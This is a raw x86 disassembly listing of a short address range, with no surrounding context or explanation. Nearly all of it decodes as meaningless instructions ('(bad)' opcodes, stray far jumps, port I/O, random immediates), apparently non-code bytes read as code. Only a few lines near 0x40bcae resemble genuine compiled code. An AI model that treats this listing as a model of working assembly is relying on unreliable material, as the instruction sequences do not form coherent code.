  40bb1d:	or     eax,0xe896e481
  40bb22:	(bad)  
  40bb23:	loope  0x40bb67
  40bb25:	xbegin 0x77cd9130
  40bb2b:	pop    esp
  40bb2c:	popf   
  40bb2d:	inc    edx
  40bb2e:	pop    ebx
  40bb2f:	push   edx
  40bb30:	jmp    0x184:0xd7a535f1
  40bb37:	pop    edi
  40bb38:	shr    dl,1
  40bb3a:	dec    eax
  40bb3b:	lods   eax,DWORD PTR ds:[esi]
  40bb3c:	push   es
  40bb3d:	retf   
  40bb3e:	fwait
  40bb3f:	push   edi
  40bb40:	add    dl,al
  40bb42:	push   ebp
  40bb43:	mov    ch,0xfc
  40bb45:	cmp    esi,ebx
  40bb47:	add    bh,BYTE PTR [edx]
  40bb49:	scas   al,BYTE PTR es:[edi]
  40bb4a:	in     eax,0x71
  40bb4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb4d:	mov    ebp,0xf0039df
  40bb52:	jp     0x40bbd1
  40bb54:	cld    
  40bb55:	cmp    ecx,DWORD PTR [edi+0x734b38df]
  40bb5b:	ss nop
  40bb5d:	sub    al,BYTE PTR [ebx-0x1f]
  40bb60:	pop    edx
  40bb61:	pop    es
  40bb62:	iret   
  40bb63:	call   0xa159:0x3b8c6262
  40bb6a:	arpl   WORD PTR [edx],bx
  40bb6c:	das    
  40bb6d:	ins    DWORD PTR es:[edi],dx
  40bb6e:	inc    esp
  40bb6f:	in     eax,0x75
  40bb71:	in     eax,0xbb
  40bb73:	mov    ah,0x7f
  40bb75:	xor    BYTE PTR [ebp+0x55a6b001],0xa3
  40bb7c:	shl    DWORD PTR [ebx-0x3fa43b24],1
  40bb82:	dec    ebx
  40bb83:	aam    0xae
  40bb85:	jmp    0x40bbe4
  40bb87:	adc    BYTE PTR [edx],dl
  40bb89:	mov    bh,0x7c
  40bb8b:	and    al,0xad
  40bb8d:	jle    0x40bbd8
  40bb8f:	mov    eax,ds:0x82fd25a0
  40bb94:	bound  eax,QWORD PTR [edx]
  40bb96:	je     0x40bba9
  40bb98:	mov    esp,0xf8719c0d
  40bb9d:	mov    ?,WORD PTR [edx+0x2ec35843]
  40bba3:	xchg   esp,eax
  40bba4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bba5:	ja     0x40bbcb
  40bba7:	ss pushf 
  40bba9:	test   ebx,0xa6222194
  40bbaf:	mov    esi,0xa1fd4d13
  40bbb4:	and    edi,DWORD PTR [edi+0x42a69ba8]
  40bbba:	mov    esi,0x36a18d54
  40bbbf:	sub    bh,0xe7
  40bbc2:	int3   
  40bbc3:	(bad)  [esi+0x4a5010e3]
  40bbc9:	and    al,BYTE PTR [ebx+0x21]
  40bbcc:	add    eax,0x902267e
  40bbd1:	lahf   
  40bbd2:	sbb    BYTE PTR [ebp+ecx*4-0x27e0d9b2],al
  40bbd9:	enter  0xdebb,0x3a
  40bbdd:	push   ss
  40bbde:	in     al,0x19
  40bbe0:	inc    eax
  40bbe1:	cmp    edi,DWORD PTR [eax+0x6ccfe02c]
  40bbe7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bbe8:	or     DWORD PTR [eax+0x17],0xd810d165
  40bbef:	sub    DWORD PTR [ebx],ecx
  40bbf1:	cmp    DWORD PTR [ecx+0x4d09447],edi
  40bbf7:	scas   al,BYTE PTR es:[edi]
  40bbf8:	and    esi,DWORD PTR [edx+ecx*2-0x6f6cd66d]
  40bbff:	and    edx,DWORD PTR [edx+0x36a8a62e]
  40bc05:	mov    dh,0x70
  40bc07:	mov    eax,ds:0x74bea410
  40bc0c:	data16 jbe 0x40bc12
  40bc0f:	inc    ebx
  40bc10:	pop    eax
  40bc11:	mov    eax,ds:0x52bd0451
  40bc16:	dec    ebp
  40bc17:	(bad)  
  40bc18:	adc    eax,0xa2bb9a46
  40bc1d:	mov    ebp,0xab58f679
  40bc22:	add    eax,0xd41829fb
  40bc27:	fwait
  40bc28:	scas   eax,DWORD PTR es:[edi]
  40bc29:	mov    ds:0x58f37353,al
  40bc2e:	jle    0x40bc2b
  40bc30:	cmp    esp,ecx
  40bc32:	sub    eax,0xb0fd1708
  40bc37:	push   ds
  40bc38:	dec    ecx
  40bc39:	and    dl,ah
  40bc3b:	mov    edx,0x7f40228a
  40bc40:	mov    al,0xcc
  40bc42:	xchg   edx,eax
  40bc43:	or     BYTE PTR [eax],0xc3
  40bc46:	add    bl,cl
  40bc48:	sub    al,0xf
  40bc4a:	cmp    dl,dh
  40bc4c:	mov    ds:0x629a60ee,eax
  40bc51:	jg     0x40bcc8
  40bc53:	xchg   esp,eax
  40bc54:	ins    BYTE PTR es:[edi],dx
  40bc55:	inc    ecx
  40bc56:	dec    edi
  40bc57:	sahf   
  40bc58:	xchg   ebp,eax
  40bc59:	pop    ds
  40bc5a:	push   eax
  40bc5b:	dec    esi
  40bc5c:	or     bl,BYTE PTR es:[ecx+eiz*1]
  40bc60:	mov    ds:0x1639431f,al
  40bc65:	pop    ss
  40bc66:	pop    edi
  40bc67:	push   edi
  40bc68:	mov    eax,ds:0xbb9603d4
  40bc6d:	in     eax,0x9f
  40bc6f:	shl    DWORD PTR [ebx-0xd31b41c],1
  40bc75:	es dec esp
  40bc77:	ficomp WORD PTR [eax+0x3b]
  40bc7a:	ss jae 0x40bc7f
  40bc7d:	dec    eax
  40bc7e:	lods   eax,DWORD PTR ds:[esi]
  40bc7f:	scas   eax,DWORD PTR es:[edi]
  40bc80:	aam    0xd7
  40bc82:	mov    ebp,0xca148be1
  40bc87:	xor    ebx,DWORD PTR [ebx+0x44]
  40bc8a:	lods   eax,DWORD PTR ds:[esi]
  40bc8b:	push   edx
  40bc8c:	add    ah,ah
  40bc8e:	jge    0x40bc28
  40bc90:	lods   eax,DWORD PTR ds:[esi]
  40bc91:	inc    edi
  40bc92:	mov    DWORD PTR ds:0xc5e0fdcb,ebp
  40bc98:	lock push cs
  40bc9a:	lds    esi,FWORD PTR [eax-0x35f0e231]
  40bca0:	add    eax,0x54d5a042
  40bca5:	and    DWORD PTR [edx+0x25],esi
  40bca8:	int3   
  40bca9:	pop    ebp
  40bcaa:	sub    ebx,edi
  40bcac:	cmp    ebx,edx
  40bcae:	mov    edx,DWORD PTR [ebp-0x38]
  40bcb1:	jbe    0x40bcba
  40bcb7:	mov    edx,DWORD PTR [ebp-0x3c]
  40bcba:	mov    edi,DWORD PTR [ebp-0x4]
  40bcbd:	xor    edi,eax
  40bcbf:	xor    edx,eax
  40bcc1:	jmp    0x40c0d8
  40bcc6:	test   DWORD PTR [ebp-0x48],ecx
  40bcc9:	rol    BYTE PTR [eax-0x33],0x8d
  40bccd:	dec    ebp
  40bcce:	pop    ecx
  40bccf:	repz ror ebx,cl
  40bcd2:	inc    ecx
  40bcd3:	sub    DWORD PTR [ebx],esi
  40bcd5:	mov    esp,esp
  40bcd7:	mov    ?,WORD PTR [esi+0x7e]
  40bcda:	jo     0x40bd55
  40bcdc:	jle    0x40bd5c
  40bcde:	xor    eax,0x43ae4757
  40bce3:	mov    ds:0x55a840d9,al
  40bce8:	pusha  
  40bce9:	outs   dx,DWORD PTR ds:[esi]
  40bcea:	cmp    DWORD PTR [ebx],edi
  40bcec:	xor    al,0x6
  40bcee:	jle    0x40bcef
  40bcf0:	lods   eax,DWORD PTR ds:[esi]
  40bcf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bcf2:	mov    ecx,0xd40389d6
  40bcf7:	jmp    0x40bd3e
  40bcf9:	sbb    al,0x91
  40bcfb:	not    DWORD PTR [edi-0x60115659]
  40bd01:	fmul   DWORD PTR [esi+0x4a]
  40bd04:	or     eax,0x6b3a8948
  40bd09:	and    al,ch
  40bd0b:	lahf   
  40bd0c:	fs push ss
  40bd0e:	mov    esp,0xb796ca78
  40bd13:	mul    esi
  40bd15:	mov    ecx,0x7b99a91
  40bd1a:	(bad)  
  40bd1b:	fcmove st,st(2)
  40bd1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd1e:	lods   al,BYTE PTR ds:[esi]
  40bd1f:	fmul   st,st(0)
  40bd21:	xchg   ecx,eax
  40bd22:	sub    DWORD PTR [ecx],esi
  40bd24:	xor    esi,esp
  40bd26:	push   ebx
  40bd27:	add    al,0x33
  40bd29:	lods   eax,DWORD PTR ds:[esi]
  40bd2a:	jle    0x40bd93
  40bd2c:	mov    esi,0xb61c0a04
  40bd31:	sar    DWORD PTR [eax+esi*1+0x56],0x92
  40bd36:	jnp    0x40bd0b
  40bd38:	pop    es
  40bd39:	xor    ch,BYTE PTR [ecx+0x7a]
  40bd3c:	addr16 ss aam 0x65
  40bd40:	push   es
  40bd41:	cmp    BYTE PTR [edi],dh
  40bd43:	neg    DWORD PTR [edx-0x11]
  40bd46:	loop   0x40bd83
  40bd48:	add    al,0xa5
  40bd4a:	enter  0xdffc,0x58
  40bd4e:	xlat   BYTE PTR ds:[ebx]
  40bd4f:	scas   al,BYTE PTR es:[edi]
  40bd50:	fadd   QWORD PTR [edx-0x14fe87bf]
  40bd56:	sub    DWORD PTR [edx-0x39],ecx
  40bd59:	mov    cl,0xdc
  40bd5b:	jl     0x40bd8e
  40bd5d:	sub    ax,0xe560
  40bd61:	test   al,0xc5
  40bd63:	xchg   ebp,eax
  40bd64:	sbb    edx,ebx
  40bd66:	sub    bl,BYTE PTR [ebp-0x2]
  40bd69:	rcl    DWORD PTR [ecx-0x73288502],cl
  40bd6f:	out    dx,eax
  40bd70:	out    dx,eax
  40bd71:	jmp    0xf8b4:0x77ae13c7
  40bd78:	adc    eax,ecx
  40bd7a:	push   ebx
  40bd7b:	bound  esp,QWORD PTR [ebx]
  40bd7d:	icebp  
  40bd7e:	ins    DWORD PTR es:[edi],dx
  40bd7f:	daa    
  40bd80:	fwait
  40bd81:	add    BYTE PTR [ecx],al
  40bd83:	and    ah,dh
  40bd85:	jbe    0x40bd3c
  40bd87:	adc    cl,BYTE PTR [esi]
  40bd89:	cwde   
  40bd8a:	repnz and ebx,DWORD PTR [ecx-0x31f28f31]
  40bd91:	mov    WORD PTR [eax+0x1767a34d],fs
  40bd97:	inc    eax
  40bd98:	xor    al,0x5e
  40bd9a:	pusha  
  40bd9b:	dec    edi
  40bd9c:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40bd9e:	jecxz  0x40bd63
  40bda0:	fimul  WORD PTR [ebp-0x738d305e]
  40bda6:	xchg   ebp,eax
  40bda7:	add    dl,BYTE PTR [ecx+0x61611355]
  40bdad:	inc    cl
  40bdaf:	(bad)  
  40bdb0:	jmp    0x40bde7
  40bdb2:	and    ah,BYTE PTR [eax+0x42fc232a]
  40bdb8:	das    
  40bdb9:	lods   al,BYTE PTR ds:[esi]
  40bdba:	adc    al,0x8a
  40bdbc:	mov    ebx,0x23e423e2
  40bdc1:	push   cs
  40bdc2:	enter  0x9b08,0x3e
  40bdc6:	shl    DWORD PTR [ebp-0x33ca812b],1
  40bdcc:	mov    cl,0x74
  40bdce:	xor    BYTE PTR ds:0xd3e9b2a2,ch
  40bdd4:	mov    ebx,0x298105a6
  40bdd9:	out    0xc5,al
  40bddb:	call   0x12da:0x4ba87e76
  40bde2:	push   esi
  40bde3:	fwait
  40bde4:	inc    esi
  40bde5:	xor    ebx,edx
  40bde7:	adc    ebx,ecx
  40bde9:	and    DWORD PTR [esi-0x4edd34d5],esp
  40bdef:	xor    ebp,eax
  40bdf1:	push   ecx
  40bdf2:	mov    ch,0xf4
  40bdf4:	pop    ds
  40bdf5:	inc    edi
  40bdf6:	mov    cl,0x6e
  40bdf8:	sub    ah,0x19
  40bdfb:	lock jmp 0xdbedce0c
  40be01:	cdq    
  40be02:	lea    eax,[edx]
  40be04:	cmp    ebx,ebp
  40be06:	adc    al,0xee
  40be08:	imul   ebx,DWORD PTR [eax],0xa947313a
  40be0e:	jb     0x40be80
  40be10:	loopne 0x40be51
  40be12:	mov    eax,ds:0x2c095823
  40be17:	inc    esp
  40be18:	fistp  QWORD PTR [eax-0x5cb778f3]
  40be1e:	sti    
  40be1f:	and    BYTE PTR [ebx+ebx*1],bl
  40be22:	fsubrp st(5),st
  40be24:	shl    BYTE PTR [edi-0xac7bb4b],cl
  40be2a:	add    eax,0xc861e096
  40be2f:	or     DWORD PTR [edi-0x38],ebx
  40be32:	pusha  
  40be33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be34:	addr16 (bad) 
  40be36:	out    0x6f,al
  40be38:	stos   BYTE PTR es:[edi],al
  40be39:	fwait
  40be3a:	jmp    0xe7a03cc
  40be3f:	in     al,0x34
  40be41:	int    0x38
  40be43:	mov    esi,0xfe4f56ca
  40be48:	fdiv   DWORD PTR [ebp+0x47]
  40be4b:	iret   
  40be4c:	add    cx,sp
  40be4f:	outs   dx,BYTE PTR ds:[esi]
  40be50:	add    eax,0x3547bebd
  40be55:	inc    eax
  40be56:	je     0x40be8d
  40be58:	add    eax,0x3b8a65f9
  40be5d:	push   eax
  40be5e:	out    0x7b,al
  40be60:	sub    ecx,DWORD PTR [esi-0x16]
  40be63:	repz cmp ecx,DWORD PTR [esp+esi*8+0x317aa264]
  40be6b:	retf   
  40be6c:	pop    edx
  40be6d:	sbb    DWORD PTR [ecx-0x57],0xffffff89
  40be71:	inc    esp
  40be72:	dec    ebp
  40be74:	xor    al,0x2c
  40be76:	scas   eax,DWORD PTR es:[edi]
  40be77:	lahf   
  40be78:	sahf   
  40be79:	lods   al,BYTE PTR ds:[esi]
  40be7a:	fwait
  40be7b:	push   ebx
  40be7c:	ins    BYTE PTR es:[edi],dx
  40be7d:	or     bl,cl
  40be7f:	push   edi
  40be80:	aaa    
  40be81:	sub    eax,0x2af4c2d9
  40be86:	mov    esp,0xc959ae86
  40be8b:	sub    eax,edi
  40be8d:	fistp  QWORD PTR [eax-0x70e89747]
  40be93:	fcomp  DWORD PTR [edx+0x29e61b6d]
  40be99:	out    0x4c,eax
  40be9b:	inc    esi
  40be9c:	and    esp,0x4116066f
  40bea2:	dec    esi
  40bea3:	(bad)  
  40bea4:	xchg   edi,eax
  40bea5:	add    eax,0xd0868f9a
  40beaa:	fmul   st(6),st
  40beac:	clc    
  40bead:	sbb    al,BYTE PTR [edx]
  40beaf:	fidivr WORD PTR [ebp+0x4b]
  40beb2:	jb     0x40bf2a
  40beb4:	inc    ebx
  40beb5:	push   0xc29feb06
  40beba:	ja     0x40becf
  40bebc:	ficomp DWORD PTR [ebp+0x33]
  40bebf:	mov    esp,0x486552e
  40bec4:	fldcw  WORD PTR [ecx]
  40bec6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bec7:	jne    0x40bf05
  40bec9:	and    dl,BYTE PTR [edi]
  40becb:	xchg   BYTE PTR [edx-0x4b],dh
  40bece:	and    eax,0xc8a389d8
  40bed3:	ins    DWORD PTR es:[edi],dx
  40bed4:	shr    DWORD PTR [ebp-0x5d1e057a],1
  40beda:	jg     0x40be8a
  40bedc:	(bad)  
  40bedd:	xor    al,0x86
  40bedf:	inc    ebx
  40bee0:	fdivr  st,st(5)
  40bee2:	lds    edi,FWORD PTR [edx+0x7]
  40bee5:	mov    esi,0xc7c25e28
  40beea:	fs je  0x40bf4e
  40beed:	retf   0xb0a9
  40bef0:	pop    ds
  40bef1:	call   0x3bee92a7
  40bef6:	add    DWORD PTR [edx],esp
  40bef8:	jmp    0x56e696e7
  40befd:	adc    eax,0xc707d99c
  40bf02:	pushf  
  40bf03:	mov    dh,0xca
  40bf05:	inc    esi
  40bf06:	jnp    0x40bf79
  40bf08:	retf   0xbf44
  40bf0b:	push   edx
  40bf0c:	sbb    al,0x8a
  40bf0e:	(bad)  
  40bf0f:	sahf   
  40bf10:	cli    
  40bf11:	add    dl,BYTE PTR [esi-0x14]
  40bf14:	popf   
  40bf15:	(bad)  
  40bf16:	sbb    al,0x5f
  40bf18:	jno    0x40beb6
  40bf1a:	inc    ebx
  40bf1b:	xchg   esi,eax
  40bf1c:	inc    edi
  40bf1d:	mov    al,0xf
  40bf1f:	mov    WORD PTR [ebp-0x63],?
  40bf22:	mov    BYTE PTR ds:0x6aed30b7,bl
  40bf28:	ins    DWORD PTR es:[edi],dx
  40bf29:	scas   al,BYTE PTR es:[edi]
  40bf2a:	jb     0x40bf84
  40bf2c:	out    dx,al
  40bf2d:	sub    DWORD PTR [esi+0x7e],ecx
  40bf30:	ja     0x40bfaf
  40bf32:	sbb    al,0xda
  40bf34:	sub    BYTE PTR [ebp+edx*2-0x23],bl
  40bf38:	call   0xdc805a7e
  40bf3d:	out    dx,al
  40bf3e:	xchg   edi,eax
  40bf3f:	dec    eax
  40bf40:	in     al,dx
  40bf41:	rcl    BYTE PTR [ecx-0x41a1c050],cl
  40bf47:	outs   dx,BYTE PTR ds:[esi]
  40bf48:	lods   eax,DWORD PTR gs:[esi]
  40bf4a:	xchg   edx,eax
  40bf4b:	in     al,dx
  40bf4c:	and    eax,0xa47a3f45
  40bf51:	cmp    al,0x6a
  40bf53:	sti    
  40bf54:	sbb    ecx,DWORD PTR [ecx]
  40bf56:	ret    0x26aa
  40bf59:	js     0x40bf14
  40bf5b:	dec    edi
  40bf5c:	lds    esp,FWORD PTR [edx]
  40bf5e:	mul    DWORD PTR [edi]
  40bf60:	pop    esp
  40bf61:	sub    DWORD PTR [edx-0x4f6e66de],esi
  40bf67:	mov    ecx,edx
  40bf69:	dec    esi
  40bf6a:	jmp    0x5a3f:0x7a43e678
  40bf71:	loopne 0x40bfa5
  40bf73:	(bad)  
  40bf75:	les    ebx,FWORD PTR [ebx-0x7f866f00]
  40bf7b:	and    BYTE PTR [ebx],bl
  40bf7d:	adc    BYTE PTR [edi+0x3f],bl
  40bf80:	add    BYTE PTR [edx],dh
  40bf82:	or     al,0xae
  40bf84:	cmp    bh,BYTE PTR [ebx+0x9c41e2f]
  40bf8a:	jg     0x40bfe2
  40bf8c:	not    edi
  40bf8e:	and    ebx,DWORD PTR [ebx+0x47]
  40bf91:	cdq    
  40bf92:	push   cs
  40bf93:	jmp    0xb11dfc94
  40bf98:	inc    edx
  40bf99:	rol    ecx,cl
  40bf9b:	stc    
  40bf9c:	or     BYTE PTR [esi-0x2c],ah
  40bf9f:	ficom  DWORD PTR [edx-0x35]
  40bfa2:	mov    cl,0x17
  40bfa4:	(bad)  
  40bfa5:	repz mov bl,BYTE PTR ds:0x9bb68714
  40bfac:	mov    ss,WORD PTR [edx+ebx*1+0x8]
  40bfb0:	mov    DWORD PTR [ecx-0x691c4090],ecx
  40bfb6:	mov    edi,edx
  40bfb8:	jne    0x40bfeb
  40bfba:	(bad)  
  40bfbb:	sub    al,0xa1
  40bfbd:	dec    DWORD PTR [ecx]
  40bfbf:	mov    esp,0x91ab5c5f
  40bfc4:	int    0x15
  40bfc6:	inc    ecx
  40bfc7:	mov    bh,0xea
  40bfc9:	sbb    edi,DWORD PTR [eax+0x77766e51]
  40bfcf:	jnp    0x40bffd
  40bfd1:	test   esi,edx
  40bfd3:	inc    ebp
  40bfd4:	jle    0x40c011
  40bfd6:	fidiv  DWORD PTR ds:0x3dc87e2a
  40bfdc:	ret    0x4987
  40bfdf:	adc    DWORD PTR [ecx+0x7b],esp
  40bfe2:	ret    0xd272
  40bfe5:	mov    esi,ebx
  40bfe7:	popa   
  40bfe8:	sar    BYTE PTR [ebx-0x49],0xd4
  40bfec:	lods   eax,DWORD PTR ds:[esi]
  40bfed:	ret    
  40bfee:	mov    ebp,0x12181e6c
  40bff3:	xchg   esi,eax
  40bff4:	daa    
  40bff5:	test   al,0xca
  40bff7:	jae    0x40bf7c
  40bff9:	mov    DWORD PTR [edi],esp
  40bffb:	push   ds
  40bffc:	mov    esp,0x94460138
  40c001:	pop    ds
  40c002:	mov    WORD PTR [ecx-0x5f],?
  40c005:	aam    0xa5
  40c007:	sbb    bl,BYTE PTR [ebp-0x37]
  40c00a:	aas    
  40c00b:	add    dl,cl
  40c00d:	push   eax
  40c00e:	int    0xf8
  40c010:	hlt    
  40c011:	arpl   WORD PTR [esi],bx
  40c013:	jae    0x40bfa4
  40c015:	imul   ecx,DWORD PTR [edi+esi*2+0x11a3be4d],0x79
  40c01d:	mov    dh,0xbf
  40c01f:	mov    ch,0x33
  40c021:	outs   dx,DWORD PTR ds:[esi]
  40c022:	(bad)  
  40c023:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c024:	aas    
  40c025:	xor    ecx,DWORD PTR [edx-0x381c5f08]
  40c02b:	arpl   WORD PTR [ecx+0x10d9caa3],sp
  40c031:	enter  0xcc91,0xd4
  40c035:	pop    ss
  40c036:	(bad)  
  40c037:	mov    ds:0x9471eacb,eax
  40c03c:	xchg   DWORD PTR [esi],ebx
  40c03e:	mov    fs,WORD PTR [ecx+0x1f0c5394]
  40c044:	jle    0x40c060
  40c046:	inc    ecx
  40c047:	(bad)  
  40c048:	dec    esi
  40c049:	stc    
  40c04a:	cmp    esi,edx
  40c04c:	pop    esi
  40c04d:	mov    cl,0x25
  40c04f:	shl    BYTE PTR cs:[esi],cl
  40c052:	ss or  ah,ah
  40c055:	xchg   edx,eax
  40c057:	ret    
  40c058:	in     eax,dx
  40c059:	xchg   esp,eax
  40c05a:	xor    eax,DWORD PTR fs:[edi+esi*4-0x7d8b7d73]
  40c062:	nop
  40c063:	out    0x2c,al
  40c065:	add    esi,DWORD PTR [esi-0x28d9f473]
  40c06b:	xor    DWORD PTR [ebx],ecx
  40c06d:	cld    
  40c06e:	xor    eax,0x31cc8e01
  40c073:	out    dx,al
  40c074:	mov    bh,0x49
  40c076:	inc    esi
  40c077:	adc    edx,edi
  40c079:	(bad)  
  40c07a:	pop    edx
  40c07b:	in     eax,0x36
  40c07d:	jl     0x40c08e
  40c07f:	daa    
  40c080:	jg     0x40c0e7
  40c082:	xchg   esi,eax
  40c083:	loop   0x40c0ee
  40c085:	push   ss
  40c086:	and    al,0xf3
  40c088:	jecxz  0x40c0a5
  40c08a:	(bad)  
  40c08b:	out    dx,al
  40c08c:	inc    edx
  40c08d:	xchg   ebx,eax
  40c08e:	sbb    eax,0xb4d06463
  40c093:	fild   QWORD PTR fs:[esi+0xc]
  40c097:	push   edx
  40c098:	push   ds
  40c099:	je     0x40c0bb
  40c09b:	hlt    
  40c09c:	aas    
  40c09d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c09e:	adc    al,0x3c
  40c0a0:	mov    BYTE PTR [edi-0x25],0x7e
  40c0a4:	nop
  40c0a5:	not    DWORD PTR [edx]
  40c0a7:	xchg   DWORD PTR [ebx+0x7365d437],ebx
  40c0ad:	push   eax
  40c0ae:	fsubr  DWORD PTR [esi]
  40c0b0:	scas   al,BYTE PTR es:[edi]
  40c0b1:	adc    al,0x49
  40c0b3:	(bad)  
  40c0b4:	jle    0x40c130
  40c0b6:	fld    st(2)
  40c0b8:	inc    esi
  40c0b9:	push   es
  40c0ba:	mov    eax,ds:0x8bb91f2d
  40c0bf:	dec    esi
  40c0c0:	pusha  
  40c0c1:	stos   DWORD PTR es:[edi],eax
  40c0c2:	jp     0x40c0e6
  40c0c4:	or     edi,DWORD PTR [ebx-0x5e]
  40c0c7:	dec    eax
  40c0c8:	add    al,0x96
  40c0ca:	in     al,0xe3
  40c0cc:	xor    DWORD PTR [ebx+edi*2],edx
  40c0cf:	out    dx,eax
  40c0d0:	lods   al,BYTE PTR ds:[esi]
  40c0d1:	outs   dx,DWORD PTR ds:[esi]
  40c0d2:	test   DWORD PTR [edx-0x1c],ebp
  40c0d5:	jbe    0x40c08e
  40c0d7:	rol    BYTE PTR [ebx],1
  40c0d9:	stc    
  40c0da:	add    edx,ecx
  40c0dc:	jmp    0x40c4f3
  40c0e1:	cmp    eax,0x7dcf74e8
  40c0e6:	dec    ebx
  40c0e7:	mov    ebp,0xd527fffc
  40c0ec:	shl    BYTE PTR [ebx-0x8],1
  40c0ef:	and    dl,bl
  40c0f1:	fimul  WORD PTR [edx+0x79707e7e]
  40c0f7:	jle    0x40c177
  40c0f9:	loop   0x40c098
  40c0fb:	dec    esp
  40c0fc:	push   esp
  40c0fd:	(bad)  
  40c0fe:	sub    BYTE PTR ds:0x4356ff24,bl
  40c104:	retf   
  40c105:	push   ss
  40c106:	ja     0x40c0ac
  40c108:	icebp  
  40c109:	push   edi
  40c10a:	jmp    0x40c09a
  40c10c:	mov    cl,0x57
  40c10e:	mov    dh,0x42
  40c110:	in     eax,dx
  40c111:	mov    bh,0x78
  40c113:	adc    edi,edi
  40c115:	jle    0x40c10f
  40c117:	jb     0x40c0de
  40c119:	cmp    ebp,DWORD PTR [edi+0x7a]
  40c11c:	jnp    0x40c110
  40c11e:	leave  
  40c11f:	push   ss
  40c120:	call   0xc7d49af5
  40c125:	not    DWORD PTR [edx-0x28]
  40c128:	push   0x4a5357e4
  40c12d:	imul   eax,DWORD PTR [eax+ecx*2+0x79],0xbfc0e1b7
  40c135:	mov    DWORD PTR [ecx+0x1876fe8f],esi
  40c13b:	xchg   ebx,eax
  40c13c:	xchg   esi,eax
  40c13d:	adc    eax,0x10ad583f
  40c142:	div    BYTE PTR [ebx]
  40c144:	pop    edx
  40c145:	sub    edx,DWORD PTR [ecx+0x2d474945]
  40c14b:	or     edx,DWORD PTR [edx]
  40c14d:	and    eax,0x9ac0ca33
  40c152:	xchg   ebx,eax
  40c153:	jle    0x40c0d9
  40c155:	mov    eax,DWORD PTR [ebx+0x5c42954e]
  40c15b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c15c:	push   0xffffffd6
  40c15e:	and    dh,BYTE PTR [edi+eiz*8+0x46]
  40c162:	dec    edi
  40c163:	pop    es
  40c164:	dec    edx
  40c165:	mov    ah,0xb0
  40c167:	pop    ss
  40c168:	test   dl,0xb9
  40c16b:	dec    edi
  40c16c:	test   eax,0x672e62fd
  40c171:	enter  0x9f6c,0x2b
  40c175:	mov    esi,0xd120086a
  40c17a:	sbb    al,0x58
  40c17c:	xchg   edx,eax
  40c17d:	push   ebp
  40c17e:	cmp    BYTE PTR [ebx],dl
  40c180:	and    eax,0xeca364af
  40c185:	addr16 in eax,dx
  40c187:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c188:	(bad)  
  40c189:	daa    
  40c18a:	cdq    
  40c18b:	in     al,dx
  40c18c:	ror    DWORD PTR [ecx-0x2],0x5a
  40c190:	mov    ss,WORD PTR [ebp-0x22]
  40c193:	shl    DWORD PTR cs:[eax+0x22157910],cl
  40c19a:	push   esp
  40c19b:	xor    BYTE PTR [esi],bl
  40c19d:	push   ebx
  40c19e:	push   eax
  40c19f:	and    dl,bh
  40c1a1:	inc    esp
  40c1a2:	cwde   
  40c1a3:	and    al,0x45
  40c1a5:	or     ebp,ecx
  40c1a7:	hlt    
  40c1a8:	mov    ah,0x3a
  40c1aa:	ficomp WORD PTR [ebp+0x70f82cbf]
  40c1b0:	pushf  
  40c1b1:	inc    eax
  40c1b2:	pop    ss
  40c1b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1b4:	sbb    ebx,edx
  40c1b6:	in     al,0xe6
  40c1b8:	stos   BYTE PTR es:[edi],al
  40c1b9:	retf   
  40c1ba:	rol    DWORD PTR [ecx-0x1bb371a1],1
  40c1c0:	mov    eax,ds:0x15f13d3e
  40c1c5:	aam    0x4a
  40c1c7:	mov    edx,0xd8b1dc0b
  40c1cc:	les    ebx,FWORD PTR [ecx]
  40c1ce:	lock scas al,BYTE PTR es:[edi]
  40c1d0:	pop    DWORD PTR [esi+0x74]
  40c1d3:	call   0x4f0:0x3a02a14b
  40c1da:	in     eax,dx
  40c1db:	fadd   DWORD PTR [eax]
  40c1dd:	arpl   dx,cx
  40c1df:	or     eax,0xa7a79f87
  40c1e4:	ins    BYTE PTR es:[edi],dx
  40c1e5:	xchg   DWORD PTR [edx-0x3e],edi
  40c1e8:	jne    0x40c1be
  40c1ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1eb:	shl    DWORD PTR [edx+0x72],1
  40c1ee:	test   DWORD PTR [edi+edx*4],edx
  40c1f1:	fs adc eax,0xd97b7720
  40c1f7:	sar    esi,0xe5
  40c1fa:	dec    esp
  40c1fb:	and    BYTE PTR [ebp-0x4b],cl
  40c1fe:	xchg   ecx,eax
  40c1ff:	sbb    cl,BYTE PTR [ecx-0x7b]
  40c202:	sub    DWORD PTR [edx+0x49],0x40
  40c206:	loopne 0x40c1c3
  40c208:	or     DWORD PTR [edi+0x5e890ccb],edi
  40c20e:	je     0x40c1b3
  40c210:	mov    bh,0x7b
  40c212:	push   edx
  40c213:	add    BYTE PTR [eax+edx*4],bl
  40c216:	cwde   
  40c217:	mov    ebx,0xf6bf5adf
  40c21c:	rol    DWORD PTR [ebp-0x6e],1
  40c21f:	pop    ecx
  40c220:	out    0x74,al
  40c222:	bound  esi,QWORD PTR [edx-0x61f829cc]
  40c228:	mov    BYTE PTR [esp+ecx*2+0xe],dl
  40c22c:	mov    DWORD PTR [ecx-0x15],eax
  40c22f:	xchg   edx,eax
  40c230:	out    dx,eax
  40c231:	mov    cl,0x1a
  40c233:	and    esi,DWORD PTR [eax-0x79713e94]
  40c239:	data16 jge 0x40c273
  40c23c:	mov    cl,0x5d
  40c23e:	jmp    0xd5cd:0x50bc4201
  40c245:	fstp   DWORD PTR [edx]
  40c247:	frstor [edi]
  40c249:	leave  
  40c24a:	call   0x8bc0e5fd
  40c24f:	xchg   ebx,eax
  40c250:	or     DWORD PTR [ebx],ebx
  40c252:	(bad)  
  40c253:	push   eax
  40c254:	mov    edi,edi
  40c256:	xchg   edx,eax
  40c257:	mov    bl,0xd9
  40c259:	push   ebp
  40c25a:	ins    DWORD PTR es:[edi],dx
  40c25b:	dec    edx
